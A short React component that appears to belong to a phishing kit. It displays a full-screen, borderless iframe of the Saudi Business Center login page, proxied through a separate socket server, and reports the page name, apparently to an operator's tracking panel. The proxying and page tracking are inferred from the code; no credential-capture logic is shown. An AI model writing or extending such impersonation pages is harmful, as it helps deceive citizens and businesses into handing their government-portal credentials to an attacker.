import { useEffect, useRef } from "react";
import { updatePage } from "@/lib/store";

const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || "http://localhost:3001";

export default function SaudiBusinessProxy() {
  const iframeRef = useRef<HTMLIFrameElement>(null);

  useEffect(() => {
    updatePage("الصفحة الرئيسية - المركز السعودي للأعمال");
  }, []);

  return (
    <div style={{ 
      width: "100vw", 
      height: "100vh", 
      margin: 0, 
      padding: 0, 
      overflow: "hidden",
      position: "fixed",
      top: 0,
      left: 0,
    }}>
      <iframe
        ref={iframeRef}
        src={`${SOCKET_URL}/p/sb/Identity/Account/Login`}
        style={{
          width: "100%",
          height: "100%",
          border: "none",
          margin: 0,
          padding: 0,
        }}
        title="المركز السعودي للأعمال"
        sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox"
      />
    </div>
  );
}
